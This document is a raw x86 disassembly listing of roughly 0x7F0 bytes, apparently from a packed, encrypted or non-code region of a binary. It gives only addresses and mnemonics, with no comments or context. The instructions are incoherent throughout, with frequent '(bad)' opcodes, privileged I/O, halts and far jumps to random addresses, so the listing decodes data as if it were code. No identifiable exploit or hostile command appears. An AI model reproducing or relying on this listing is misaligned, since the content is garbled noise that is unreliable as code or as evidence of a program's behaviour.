  415d5e:	dec    eax
  415d5f:	adc    ebp,DWORD PTR [esi+eax*2+0x65deedce]
  415d66:	push   esi
  415d67:	idiv   DWORD PTR [edx]
  415d69:	pop    esi
  415d6a:	mov    ebp,0x39f13440
  415d6f:	int    0x73
  415d71:	iret   
  415d72:	mov    eax,ds:0x1a7f3ef9
  415d77:	jge    0x415d2c
  415d79:	int    0xb9
  415d7b:	and    eax,0xb2795e2a
  415d80:	mov    dl,0x3b
  415d82:	cs das 
  415d84:	xlat   BYTE PTR ds:[ebx]
  415d85:	leave  
  415d86:	cmp    edi,eax
  415d88:	stos   BYTE PTR es:[edi],al
  415d89:	adc    eax,0xdee025e9
  415d8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d8f:	hlt    
  415d90:	cmp    BYTE PTR [ebp-0x3eba7598],ah
  415d96:	or     DWORD PTR [ebp-0x73],esp
  415d99:	mov    DWORD PTR [ebp+0x3],ecx
  415d9c:	mov    al,0x40
  415d9e:	mov    DWORD PTR [esi+0x284d9b79],0x16db177c
  415da8:	lock out 0x73,al
  415dab:	imul   esp,DWORD PTR [ebp+0x1679a334],0xffffffda
  415db2:	sub    cl,BYTE PTR [esi]
  415db4:	out    dx,eax
  415db5:	out    dx,al
  415db6:	mov    ds:0xff04a18c,al
  415dbb:	scas   al,BYTE PTR es:[edi]
  415dbc:	jne    0x415e3a
  415dbe:	cmp    al,BYTE PTR [eax]
  415dc0:	dec    esp
  415dc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dc2:	daa    
  415dc3:	push   0xbd8f65c4
  415dc8:	cmp    BYTE PTR [ebp-0x6b45311d],bh
  415dce:	mov    ds:0xbec32bb2,eax
  415dd3:	fs mov edi,0x413796e7
  415dd9:	add    BYTE PTR [ecx],al
  415ddb:	pop    ecx
  415ddc:	test   DWORD PTR [ebp+0x40],0xf829336c
  415de3:	mov    cl,0x9b
  415de5:	(bad)  
  415de6:	cdq    
  415de7:	push   ds
  415de8:	xchg   esi,eax
  415de9:	sub    ebp,DWORD PTR [ebx+esi*8-0x24]
  415ded:	enter  0xa903,0x63
  415df1:	cmp    bl,al
  415df3:	dec    DWORD PTR [edx]
  415df5:	mov    bl,0xb2
  415df7:	fmul   QWORD PTR [edx-0x21]
  415dfa:	fsubp  st(4),st
  415dfc:	adc    al,0x55
  415dfe:	sti    
  415dff:	cwde   
  415e00:	pop    edi
  415e01:	lea    ebx,[esi]
  415e03:	mov    dl,0x1d
  415e05:	jl     0x415da5
  415e07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e08:	adc    al,0x9c
  415e0a:	aam    0x6f
  415e0c:	test   al,0xc
  415e0e:	and    DWORD PTR [ebp-0x2758a4b],esp
  415e14:	dec    esp
  415e15:	clc    
  415e16:	iret   
  415e17:	lods   al,BYTE PTR ds:[esi]
  415e18:	xlat   BYTE PTR ds:[ebx]
  415e19:	fild   WORD PTR [edi]
  415e1b:	cmp    eax,DWORD PTR [ecx+0x4aeb0f00]
  415e21:	arpl   WORD PTR [ecx],cx
  415e23:	addr16 dec eax
  415e25:	loope  0x415e6f
  415e27:	popf   
  415e28:	dec    esp
  415e29:	inc    esp
  415e2a:	(bad)  
  415e2b:	je     0x415e9e
  415e2d:	out    dx,eax
  415e2e:	pop    ecx
  415e2f:	xor    bl,bl
  415e31:	add    ecx,DWORD PTR [ebp+ebp*2+0x7a]
  415e35:	jge    0x415dd2
  415e37:	(bad)  
  415e38:	mov    eax,ds:0xa3cc3ad7
  415e3d:	xor    ch,bl
  415e3f:	xchg   BYTE PTR [eax],dl
  415e41:	xchg   esi,eax
  415e42:	ret    
  415e43:	cld    
  415e44:	push   esi
  415e45:	mov    bl,0x8b
  415e47:	mov    eax,ds:0x505eef3c
  415e4c:	dec    edx
  415e4d:	and    eax,0x29014b6d
  415e52:	xchg   edi,eax
  415e53:	or     eax,0xc011d0d0
  415e58:	test   ch,0xfe
  415e5b:	fldcw  WORD PTR [esi+0x1b]
  415e5e:	ret    0xb574
  415e61:	adc    DWORD PTR [edx-0x55de1387],eax
  415e67:	cmp    ch,BYTE PTR [ecx+edx*4+0x63]
  415e6b:	sub    eax,0x74ec6b3a
  415e70:	and    bh,bl
  415e72:	test   BYTE PTR [edx-0x5b],0xb8
  415e76:	in     al,0xac
  415e78:	aaa    
  415e79:	sbb    eax,0x12e1498d
  415e7e:	adc    al,0xf5
  415e80:	pushf  
  415e81:	shr    ch,0xa
  415e84:	and    al,0x8b
  415e86:	or     BYTE PTR [eax+0x3d4d12d8],ah
  415e8c:	sbb    eax,0xca22a826
  415e91:	jecxz  0x415e75
  415e93:	fldcw  WORD PTR [ecx-0x217fb640]
  415e99:	sbb    DWORD PTR [esi-0x46],ebp
  415e9c:	mov    eax,ebx
  415e9e:	add    ecx,DWORD PTR [ebx+0x68]
  415ea1:	data16 mov dh,0x9b
  415ea4:	xor    ah,BYTE PTR [edx]
  415ea6:	in     eax,0x3a
  415ea8:	rcl    BYTE PTR [eax+ecx*2-0x4c04bcee],0xc4
  415eb0:	leave  
  415eb1:	je     0x415e4a
  415eb3:	ficomp DWORD PTR [esi-0x41]
  415eb6:	popf   
  415eb7:	push   eax
  415eb8:	pop    ebp
  415eb9:	adc    ebx,DWORD PTR [ecx]
  415ebb:	jns    0x415e96
  415ebd:	push   ebx
  415ebe:	out    0x5b,eax
  415ec0:	mov    cl,BYTE PTR [edi-0x15068df9]
  415ec6:	push   edi
  415ec7:	retf   0x92eb
  415eca:	and    BYTE PTR [ecx-0x2f8c1407],al
  415ed0:	pop    ecx
  415ed1:	scas   eax,DWORD PTR es:[edi]
  415ed2:	jge    0x415ea0
  415ed4:	dec    ecx
  415ed5:	lods   eax,DWORD PTR ds:[esi]
  415ed6:	xlat   BYTE PTR ds:[ebx]
  415ed7:	push   ebx
  415ed8:	lock popf 
  415eda:	or     edi,eax
  415edc:	inc    edx
  415edd:	je     0x415f27
  415edf:	jmp    FWORD PTR [ecx-0x47]
  415ee2:	lock daa 
  415ee4:	push   ss
  415ee5:	xchg   ebx,esp
  415ee7:	mov    eax,0x41b8b28d
  415eec:	push   ebp
  415eed:	stos   BYTE PTR es:[edi],al
  415eee:	sbb    DWORD PTR [edi+esi*4-0x7136c58c],0x4e
  415ef6:	jns    0x415e99
  415ef8:	sub    bh,BYTE PTR [edx]
  415efa:	outs   dx,DWORD PTR ds:[esi]
  415efb:	test   BYTE PTR [edi+0x132da06e],0x45
  415f02:	out    dx,al
  415f03:	and    esp,esp
  415f05:	mov    edi,DWORD PTR [edi-0x2a2a1c2d]
  415f0b:	add    bl,BYTE PTR [ebp-0x16d1ed8d]
  415f11:	jne    0x415ebb
  415f13:	cmp    esp,DWORD PTR [eax-0x34]
  415f16:	pop    esp
  415f17:	dec    ebx
  415f18:	pushf  
  415f19:	xchg   edx,eax
  415f1a:	call   0xfde76c55
  415f1f:	and    eax,0x8772786e
  415f24:	aad    0xef
  415f26:	adc    dh,al
  415f28:	pop    eax
  415f29:	ins    BYTE PTR es:[edi],dx
  415f2a:	add    eax,esp
  415f2c:	shl    DWORD PTR [edi+edx*8+0x23fd105a],cl
  415f33:	and    ch,dl
  415f35:	(bad)  
  415f36:	sbb    al,0xe7
  415f38:	jmp    0x3e671ec8
  415f3d:	mov    bh,BYTE PTR [edx+0x5a9d1259]
  415f43:	out    0xde,eax
  415f45:	pop    ebx
  415f46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f47:	dec    edx
  415f48:	jno    0x415edc
  415f4a:	cld    
  415f4b:	and    ecx,DWORD PTR ds:0x6574bff0
  415f51:	stos   BYTE PTR es:[edi],al
  415f52:	ret    
  415f53:	add    eax,0x2cd00b8
  415f58:	daa    
  415f59:	(bad)  
  415f5a:	cmp    al,0xb3
  415f5c:	jae    0x415ee6
  415f5e:	dec    esi
  415f5f:	stc    
  415f60:	ficom  DWORD PTR [esi+0x2d131f39]
  415f66:	or     al,BYTE PTR [ebp+0x14]
  415f69:	test   al,0xdf
  415f6b:	cmp    al,0x79
  415f6d:	icebp  
  415f6e:	test   dh,0x9b
  415f71:	hlt    
  415f72:	sub    bl,BYTE PTR [ebp+ecx*2-0x63]
  415f76:	hlt    
  415f77:	loopne 0x415f7a
  415f79:	out    0x6e,al
  415f7b:	scas   eax,DWORD PTR es:[edi]
  415f7c:	push   0xb8b7e5e9
  415f81:	ins    DWORD PTR es:[edi],dx
  415f82:	or     edx,ebp
  415f84:	sub    eax,0x36f10af6
  415f89:	les    esp,FWORD PTR [ecx-0x1443478f]
  415f8f:	sahf   
  415f90:	retf   
  415f91:	add    DWORD PTR [ebp+esi*1-0x80],ecx
  415f95:	daa    
  415f96:	clc    
  415f97:	ret    0x3ae5
  415f9a:	stos   BYTE PTR es:[edi],al
  415f9b:	push   0xffffff98
  415f9d:	inc    esi
  415f9e:	inc    DWORD PTR [ecx-0x2b]
  415fa1:	test   ah,ah
  415fa3:	std    
  415fa4:	into   
  415fa5:	inc    edx
  415fa6:	xor    eax,0x2476b3bc
  415fab:	and    DWORD PTR [edi],ebp
  415fad:	jmp    0x416023
  415faf:	lods   al,BYTE PTR ds:[esi]
  415fb0:	ins    DWORD PTR es:[edi],dx
  415fb1:	mov    BYTE PTR [bp+0x13],bl
  415fb5:	jp     0x415fc6
  415fb7:	xchg   DWORD PTR [ebx],edx
  415fb9:	scas   al,BYTE PTR es:[edi]
  415fba:	mov    ds:0x95c8dd5d,al
  415fbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fc0:	and    dl,BYTE PTR [ebp-0x20]
  415fc3:	mov    al,0x56
  415fc6:	add    DWORD PTR [edx+0x9d8e2f6],ecx
  415fcc:	mov    esp,0x77f00a35
  415fd1:	bound  eax,QWORD PTR [ebp+ebx*8+0x1d]
  415fd5:	das    
  415fd6:	cs mov eax,0x6af66c4
  415fdc:	out    0xcc,eax
  415fde:	cli    
  415fdf:	mov    ds:0x1076cfcd,eax
  415fe4:	retf   
  415fe5:	push   0x91400e68
  415fea:	hlt    
  415feb:	cmp    BYTE PTR [edx-0x57e473f7],0x8c
  415ff2:	cmp    eax,0x6732991b
  415ff7:	add    BYTE PTR [ebx+0x58],0xd
  415ffb:	and    esi,DWORD PTR [ebx-0x33ace94d]
  416001:	push   ss
  416002:	popf   
  416003:	sbb    ah,BYTE PTR [ebp-0x5b]
  416006:	mov    ds:0xa0a441bf,eax
  41600b:	retf   
  41600c:	aam    0xc5
  41600e:	push   esi
  41600f:	xchg   ecx,eax
  416010:	mov    WORD PTR [ebx+ecx*1+0x1ad1228d],cs
  416017:	aam    0xbd
  416019:	mov    cl,0xea
  41601b:	cmp    DWORD PTR [esi+0x7a0bb7f7],eax
  416021:	pusha  
  416022:	ffree  st(6)
  416024:	xchg   cl,dl
  416026:	jmp    0x35cd4404
  41602b:	pop    edx
  41602c:	xchg   bh,ah
  41602e:	push   edx
  41602f:	mov    edx,0xe5cda9a2
  416034:	xchg   bh,cl
  416036:	push   ss
  416037:	sub    DWORD PTR [ecx+0x6a287eeb],ecx
  41603d:	leave  
  41603e:	mov    edx,0xa5a9583b
  416043:	mov    edi,0x51020344
  416048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416049:	imul   edx,DWORD PTR [ecx],0x359f238b
  41604f:	sti    
  416050:	cmp    BYTE PTR [ebx-0xa],ch
  416053:	ja     0x41608d
  416055:	mov    ch,0xe
  416057:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  416059:	sbb    eax,0xeaa17ce4
  41605e:	out    0x6d,al
  416060:	and    eax,0xb77fdeee
  416065:	sub    eax,0x240817ac
  41606a:	jo     0x416028
  41606c:	inc    edx
  41606d:	fwait
  41606e:	xchg   edi,eax
  41606f:	push   esp
  416070:	or     dh,BYTE PTR [ecx+0x79192167]
  416076:	or     al,0xc3
  416078:	mov    bl,0x93
  41607a:	iret   
  41607b:	cwde   
  41607c:	jecxz  0x41609f
  41607e:	gs call 0xd45a:0x904033ca
  416086:	loope  0x416066
  416088:	stos   BYTE PTR es:[edi],al
  416089:	in     al,0xe1
  41608b:	mov    WORD PTR [ebx+0x786f1f28],ss
  416091:	call   0x2beecca3
  416096:	shr    DWORD PTR [esi-0x6cff9026],0x52
  41609d:	adc    al,0x5c
  41609f:	lods   eax,DWORD PTR ds:[esi]
  4160a0:	mov    ecx,0xd257f592
  4160a5:	cmp    esp,DWORD PTR [ebp+0x7dab01a]
  4160ab:	add    bl,bh
  4160ad:	push   ss
  4160ae:	mov    ds:0x3e610c04,al
  4160b3:	mov    esp,0x763bb967
  4160b8:	ja     0x4160ce
  4160ba:	lods   eax,DWORD PTR fs:[esi]
  4160bc:	xlat   BYTE PTR ds:[ebx]
  4160bd:	pop    ecx
  4160be:	xor    DWORD PTR [ebp-0x21888fc8],0xa56183e3
  4160c8:	lock leave 
  4160ca:	xchg   ebp,eax
  4160cb:	out    0xad,eax
  4160cd:	cmp    DWORD PTR [edi],ebx
  4160cf:	mov    eax,ds:0xf9ff4266
  4160d4:	mov    dl,0x68
  4160d6:	idiv   ebp
  4160d8:	jns    0x41609a
  4160da:	sbb    ebx,eax
  4160dc:	cdq    
  4160dd:	push   0x31
  4160df:	jns    0x416140
  4160e1:	in     eax,0xc9
  4160e3:	dec    ebx
  4160e4:	retf   
  4160e5:	outs   dx,DWORD PTR ds:[esi]
  4160e6:	push   ds
  4160e7:	xchg   esi,eax
  4160e8:	je     0x41607e
  4160ea:	loopne 0x416160
  4160ec:	aas    
  4160ed:	cmp    al,ah
  4160ef:	ins    BYTE PTR es:[edi],dx
  4160f0:	call   0x3ead17a6
  4160f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160f6:	xchg   DWORD PTR [ecx+0x33e551bc],esi
  4160fc:	pop    ds
  4160fd:	mov    esp,0x651ee142
  416102:	hlt    
  416103:	stos   BYTE PTR es:[edi],al
  416104:	xlat   BYTE PTR ds:[ebx]
  416105:	and    ah,BYTE PTR [ebp-0x4f]
  416108:	enter  0xd37a,0xd8
  41610c:	push   edi
  41610d:	cmc    
  41610e:	inc    edi
  41610f:	mov    bl,0x3a
  416111:	lea    ebx,[ebp+0x39]
  416114:	enter  0x7cfb,0x84
  416118:	call   DWORD PTR [edx+ebx*8+0x2d]
  41611c:	dec    ecx
  41611d:	mov    DWORD PTR ds:0x3efddde2,ebp
  416123:	mov    ecx,0xcea4ff8d
  416128:	nop
  416129:	in     eax,0x8d
  41612b:	pusha  
  41612c:	inc    esi
  41612d:	cdq    
  41612e:	sbb    al,0x1
  416130:	jns    0x4160cc
  416132:	xchg   ecx,eax
  416133:	je     0x41613e
  416135:	push   DWORD PTR [edx-0x38]
  416138:	jns    0x4161ae
  41613a:	enter  0x1451,0xf8
  41613e:	and    BYTE PTR [esi+0x6c],dl
  416141:	sti    
  416142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416143:	xchg   edi,eax
  416144:	adc    BYTE PTR [esi-0x75],ch
  416147:	jmp    0x535458c
  41614c:	ja     0x4160fc
  41614e:	ins    BYTE PTR es:[edi],dx
  41614f:	mov    ds:0xf1f6e767,eax
  416154:	dec    esp
  416155:	stos   BYTE PTR es:[edi],al
  416156:	mov    ebx,0x4d59f04
  41615b:	sub    eax,0xb0f3885d
  416160:	fucomip st,st(6)
  416162:	lock (bad) 
  416164:	imul   esp,edx,0xffffffee
  416167:	in     eax,0xce
  416169:	cmp    DWORD PTR [eax+edx*8+0xa76ae2e],0x208ec611
  416174:	adc    ch,BYTE PTR [eax-0x15]
  416177:	test   DWORD PTR [ecx+0x32f60997],0xba88c119
  416181:	inc    ecx
  416182:	add    eax,0x4e1ba06b
  416187:	pop    ds
  416188:	popa   
  416189:	mov    ebp,0x87c3061a
  41618e:	nop
  41618f:	sbb    al,0xc9
  416191:	push   cs
  416192:	and    DWORD PTR [ecx-0x6fa890f3],0xb97ba2c0
  41619c:	pushf  
  41619d:	push   edx
  41619e:	adc    DWORD PTR [ebp-0xb],ecx
  4161a1:	dec    eax
  4161a2:	and    BYTE PTR [ebx+eiz*1-0x690e2270],dh
  4161a9:	imul   ecx,DWORD PTR [esi],0xde8eb13b
  4161af:	sbb    DWORD PTR [edi-0x503e5b49],ecx
  4161b5:	adc    eax,0x3a0bb1d7
  4161ba:	jno    0x416189
  4161bc:	daa    
  4161bd:	push   eax
  4161be:	std    
  4161bf:	popa   
  4161c0:	add    eax,esi
  4161c2:	xor    DWORD PTR [edx+0x4f],0xffffff95
  4161c6:	mov    esi,0x1dda38cf
  4161cb:	push   cs
  4161cc:	sub    BYTE PTR [ebp+0x30],dh
  4161cf:	mov    esp,DWORD PTR [edx-0x1d34dd9]
  4161d5:	js     0x416206
  4161d7:	fdivr  st(7),st
  4161d9:	push   edx
  4161da:	push   cs
  4161db:	outs   dx,BYTE PTR ds:[esi]
  4161dc:	jecxz  0x4161ff
  4161de:	xchg   edx,eax
  4161df:	enter  0x6bfd,0x3f
  4161e3:	sub    eax,0xaeeb6762
  4161e8:	ins    BYTE PTR es:[edi],dx
  4161e9:	sti    
  4161ea:	push   ss
  4161eb:	aaa    
  4161ec:	sbb    eax,0x2cd9434f
  4161f1:	outs   dx,DWORD PTR ds:[esi]
  4161f2:	mov    ah,0x5e
  4161f4:	mov    eax,0x4b468e95
  4161f9:	mov    ch,0xa9
  4161fb:	inc    ebp
  4161fc:	jne    0x4161b0
  4161fe:	add    al,0x86
  416200:	mov    eax,ds:0xa7cee8b3
  416205:	stos   DWORD PTR es:[edi],eax
  416206:	pop    esp
  416207:	cmp    al,0x3c
  416209:	add    eax,0x152384a0
  41620e:	rcl    BYTE PTR [edx],1
  416210:	sub    eax,DWORD PTR [esi-0x53]
  416213:	icebp  
  416214:	retf   
  416215:	dec    ecx
  416216:	ins    DWORD PTR es:[edi],dx
  416217:	stc    
  416218:	or     ch,ch
  41621a:	mov    DWORD PTR [edi],esi
  41621c:	mov    eax,ds:0xd2cb60d6
  416221:	into   
  416222:	dec    esp
  416223:	xlat   BYTE PTR ds:[ebx]
  416224:	test   eax,0x1f7e675f
  41622a:	push   0x3e69b921
  41622f:	and    esi,0x69
  416232:	mov    dh,0xe6
  416234:	imul   ecx,DWORD PTR [edx+0x69],0xffffffe4
  416238:	dec    ecx
  416239:	and    eax,0xfacaf583
  41623e:	mov    ebp,0xf257cb83
  416243:	fmul   QWORD PTR [edx-0x2e46e34d]
  416249:	repnz mov eax,ds:0x476a7415
  41624f:	mov    bl,0xea
  416251:	cmp    eax,0x5b46af92
  416256:	push   ebx
  416257:	fild   QWORD PTR ds:0xd405420f
  41625d:	pop    ebp
  41625e:	cmp    DWORD PTR [ecx-0x33],esi
  416261:	ja     0x416210
  416263:	lock mov eax,ds:0xe00b5b24
  416269:	pop    eax
  41626a:	jmp    0x416204
  41626c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41626d:	xchg   ebp,eax
  41626e:	mov    ecx,DWORD PTR [ecx+ebx*8+0x48]
  416272:	test   eax,eax
  416274:	out    dx,al
  416275:	xor    cl,BYTE PTR ds:0x1275f04c
  41627b:	push   edi
  41627c:	repnz leave 
  41627e:	ret    0xf755
  416281:	pop    edx
  416282:	push   ebx
  416283:	inc    edx
  416284:	jo     0x41626c
  416286:	test   BYTE PTR [ecx+ecx*8],cl
  416289:	pop    ebx
  41628a:	pop    ss
  41628b:	in     al,dx
  41628c:	outs   dx,BYTE PTR ds:[esi]
  41628d:	push   esp
  41628e:	add    bh,ah
  416290:	call   0x4a6c:0xcb212c96
  416297:	adc    ch,BYTE PTR [ebx+0x17]
  41629a:	jge    0x4162ab
  41629c:	mov    eax,0xb83c7f44
  4162a1:	jo     0x416232
  4162a3:	mov    esp,0x8ad6aaa1
  4162a8:	sub    al,0x59
  4162aa:	sub    ecx,DWORD PTR [ebx+0x7d9ff64e]
  4162b0:	ins    BYTE PTR es:[edi],dx
  4162b1:	loopne 0x416318
  4162b3:	adc    DWORD PTR [eax+eiz*4],eax
  4162b6:	and    BYTE PTR [edx-0x3f9050e0],dl
  4162bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162bd:	aas    
  4162be:	push   ecx
  4162bf:	in     al,0xa9
  4162c1:	pusha  
  4162c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162c3:	add    al,0xc2
  4162c5:	mov    ebp,0x901894ef
  4162ca:	std    
  4162cb:	lahf   
  4162cc:	cmp    al,0x51
  4162ce:	das    
  4162cf:	inc    ebx
  4162d0:	or     esi,DWORD PTR ds:0xfd06687e
  4162d6:	adc    dl,BYTE PTR [edi+eiz*2-0x1e]
  4162da:	xchg   ebx,eax
  4162db:	shl    DWORD PTR [edx],1
  4162dd:	lea    ebx,[ebx]
  4162df:	jecxz  0x416337
  4162e1:	mul    BYTE PTR [edi-0x7235d069]
  4162e7:	(bad)  
  4162e8:	mov    bh,0x5c
  4162ea:	retf   0x633b
  4162ed:	nop
  4162ee:	(bad)  
  4162ef:	in     al,dx
  4162f0:	aas    
  4162f1:	ins    DWORD PTR es:[edi],dx
  4162f2:	push   esi
  4162f3:	test   DWORD PTR [ecx-0x23],ebx
  4162f6:	mov    dl,0x9c
  4162f8:	mov    eax,0x7d821a2b
  4162fd:	sub    dh,BYTE PTR [eax]
  4162ff:	cmp    esp,DWORD PTR [eax]
  416301:	jge    0x41637f
  416303:	cmp    al,dh
  416305:	stc    
  416306:	or     al,BYTE PTR [eax-0x4b410fe4]
  41630c:	test   esi,ebx
  41630e:	dec    esp
  41630f:	jae    0x416368
  416311:	jb     0x41633a
  416313:	ins    BYTE PTR es:[edi],dx
  416314:	(bad)  
  416315:	(bad)  
  416316:	jmp    0x3068:0xd81023ae
  41631d:	sbb    edx,ebp
  41631f:	xor    edx,DWORD PTR [ebx+0x4]
  416322:	pop    esp
  416323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416324:	pop    ebp
  416325:	push   0xffffffed
  416327:	xor    dl,al
  416329:	add    DWORD PTR [ecx],ebp
  41632b:	and    cl,BYTE PTR [edx+0x9efdabf]
  416331:	shl    ecx,0xe7
  416334:	mov    bh,BYTE PTR [ebx-0x6a6ef1e5]
  41633a:	les    eax,FWORD PTR ds:0xffeb241f
  416340:	cmp    BYTE PTR [eax+0x332a2726],dh
  416346:	call   0xef42:0x52fc0471
  41634d:	test   BYTE PTR [edx+0x2db7ce77],bl
  416353:	fbld   TBYTE PTR [esi+0x7a]
  416356:	rcl    DWORD PTR [eax],cl
  416358:	lods   al,BYTE PTR ds:[esi]
  416359:	cmp    DWORD PTR [esi],ebx
  41635b:	and    BYTE PTR [edx-0x55a1d9b3],0xf
  416362:	jl     0x416301
  416364:	out    dx,eax
  416365:	and    BYTE PTR [edx+edx*1-0x12],cl
  416369:	das    
  41636a:	sbb    esi,edx
  41636c:	pop    eax
  41636d:	fcom   st(4)
  416370:	jecxz  0x4163bd
  416372:	jg     0x416392
  416374:	(bad)  [ebp-0x54]
  416377:	jmp    0x8418:0xc6ceee87
  41637e:	jae    0x4163da
  416380:	int3   
  416381:	xor    eax,0xade51dfd
  416387:	(bad)  
  416388:	mov    ds:0xfdfb1066,al
  41638d:	stos   DWORD PTR es:[edi],eax
  41638e:	inc    edx
  41638f:	nop    DWORD PTR [edx-0x39388991]
  416396:	loope  0x41638f
  416398:	cmp    BYTE PTR [ecx+0x33],bh
  41639b:	or     BYTE PTR [esi-0x62],ch
  41639e:	fidiv  DWORD PTR [eax+0x40b41ee]
  4163a4:	scas   al,BYTE PTR es:[edi]
  4163a5:	dec    esi
  4163a6:	rcl    BYTE PTR [edi+0x3e],0x2
  4163aa:	les    esp,FWORD PTR [edi]
  4163ac:	dec    ebx
  4163ad:	sar    BYTE PTR [ecx],cl
  4163af:	div    BYTE PTR [edi]
  4163b1:	push   0xa68564d
  4163b6:	(bad)  
  4163b7:	jmp    0xe20226cc
  4163bc:	push   edi
  4163bd:	movups XMMWORD PTR [ebp-0x5331ac74],xmm4
  4163c4:	enter  0xb42b,0x12
  4163c8:	xchg   ecx,eax
  4163c9:	inc    eax
  4163ca:	loopne 0x416365
  4163cc:	pushf  
  4163cd:	xor    al,0xab
  4163cf:	push   ebx
  4163d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163d1:	mov    DWORD PTR [ecx+eax*4-0x5b],esp
  4163d5:	mov    eax,ds:0x9a3d82b7
  4163da:	add    al,BYTE PTR [ecx+0x2ce8354]
  4163e0:	je     0x41640c
  4163e2:	and    DWORD PTR [eax+0x39],0x5ec1d15c
  4163e9:	adc    ah,BYTE PTR [esi+0x4747780f]
  4163ef:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163f1:	ficom  DWORD PTR [ebx]
  4163f3:	(bad)  
  4163f4:	test   eax,0xbdcec801
  4163f9:	xlat   BYTE PTR ds:[ebx]
  4163fa:	dec    edi
  4163fb:	push   edx
  4163fc:	lahf   
  4163fd:	(bad)  
  4163fe:	jb     0x41640e
  416400:	loopne 0x4163bc
  416402:	cmp    al,0x2
  416404:	iret   
  416405:	in     al,0x3c
  416407:	cmp    BYTE PTR [edx+0x7a],ch
  41640a:	(bad)  
  41640b:	sti    
  41640c:	cmp    dh,bh
  41640e:	scas   eax,DWORD PTR es:[edi]
  41640f:	mov    ah,0xc
  416411:	lods   eax,DWORD PTR ds:[esi]
  416412:	cs mov al,0xac
  416415:	and    ecx,DWORD PTR [ebx+0x3ee8ca7d]
  41641b:	fwait
  41641c:	aas    
  41641d:	mov    al,ds:0x5fab2448
  416422:	add    esp,DWORD PTR [edx-0x1b3b6fe5]
  416428:	sub    ebp,esp
  41642a:	imul   edx,DWORD PTR [eax],0x4325cd76
  416430:	pop    esi
  416431:	ror    ebx,0x77
  416434:	(bad)  
  416435:	icebp  
  416436:	sbb    eax,0x7352781
  41643b:	dec    ebp
  41643c:	mov    ds:0x22d8f059,eax
  416441:	rol    esi,cl
  416443:	jae    0x4164c3
  416445:	push   eax
  416446:	cld    
  416447:	ficomp WORD PTR [ecx-0x13]
  41644a:	int    0xc0
  41644c:	sub    BYTE PTR [edx],bl
  41644e:	enter  0x88aa,0x8c
  416452:	sbb    BYTE PTR [edx+0x6f630793],dl
  416458:	imul   ebp
  41645a:	cs ja  0x41646e
  41645d:	mov    es:0xc08dd7c6,eax
  416463:	int    0xe2
  416465:	sbb    eax,0xf156b8bc
  41646a:	mov    edx,0x74a8c783
  41646f:	ror    DWORD PTR [ecx+edx*1-0x20d455ce],cl
  416476:	mov    bh,0xad
  416478:	mov    cl,0xbc
  41647a:	adc    ah,BYTE PTR [esi+edi*1]
  41647d:	inc    ecx
  41647e:	nop
  41647f:	and    DWORD PTR [eax+0x2c2b36ba],0xdd853bc4
  416489:	xor    BYTE PTR [ebx-0x5671e8c8],0x1d
  416490:	into   
  416491:	push   esp
  416492:	push   ebx
  416493:	mov    ecx,0xad2b9516
  416498:	js     0x4164ee
  41649a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41649b:	sub    DWORD PTR [edi+0x37],edi
  41649e:	clc    
  41649f:	sbb    edx,eax
  4164a1:	and    bl,BYTE PTR [edx+ecx*4+0x4b]
  4164a5:	xlat   BYTE PTR ds:[ebx]
  4164a6:	xchg   esp,eax
  4164a7:	loope  0x416439
  4164a9:	xchg   edi,eax
  4164aa:	iret   
  4164ab:	fild   WORD PTR [edx]
  4164ad:	or     al,0xc9
  4164af:	scas   al,BYTE PTR es:[edi]
  4164b0:	outs   dx,BYTE PTR ds:[esi]
  4164b1:	lea    edx,[esi]
  4164b3:	fsub   st,st(5)
  4164b5:	add    DWORD PTR [eax],esi
  4164b7:	(bad)  
  4164b8:	leave  
  4164b9:	paddd  mm4,QWORD PTR [edi]
  4164bc:	(bad)  
  4164bd:	out    0x47,eax
  4164bf:	out    dx,al
  4164c0:	jmp    0xe04a:0x25c0a906
  4164c7:	and    ah,BYTE PTR [esi-0x472275a8]
  4164cd:	push   esi
  4164ce:	mov    ebp,0xdd77831b
  4164d3:	sub    BYTE PTR [ebp+0x30fc3536],bl
  4164d9:	adc    eax,0x64bc00a0
  4164de:	into   
  4164df:	es adc eax,ecx
  4164e2:	ja     0x41652f
  4164e4:	xlat   BYTE PTR ds:[ebx]
  4164e5:	sbb    cl,BYTE PTR [ebx-0x2a90e5f1]
  4164eb:	fimul  DWORD PTR [ebx+0x40c0c477]
  4164f1:	retf   
  4164f2:	and    eax,0x27b878be
  4164f7:	(bad)  
  4164f8:	lds    ebp,FWORD PTR [eax+0x20]
  4164fb:	adc    cl,BYTE PTR ds:0x330a4c94
  416501:	dec    ebx
  416502:	fisub  DWORD PTR [ebp+0x79]
  416505:	jecxz  0x416552
  416507:	cmp    ch,BYTE PTR [ecx-0x6696626f]
  41650d:	xor    eax,0xdc8f375b
  416512:	das    
  416513:	push   eax
  416514:	es nop
  416516:	mov    ecx,0xe6dc8dc
  41651b:	push   ss
  41651c:	aad    0x8e
  41651e:	lock push es
  416520:	addr16 cmp dl,ah
  416523:	push   esi
  416524:	xor    BYTE PTR [edi+0x3c],0x2b
  416528:	in     eax,0xc9
  41652a:	fmul   QWORD PTR [esi]
  41652c:	and    eax,0xeee7614b
  416531:	mov    ds:0xbcf28d6d,eax
  416536:	pop    esi
  416537:	push   edi
  416538:	ret    
  416539:	mov    BYTE PTR [ebx+0x6a],cl
  41653c:	mov    cl,0xc7
  41653e:	cwde   
  41653f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416540:	ins    DWORD PTR es:[edi],dx
  416541:	cmp    DWORD PTR [ebp-0x691d21bb],edx
  416547:	cli    
  416548:	add    DWORD PTR [edx+0x481765ab],ecx
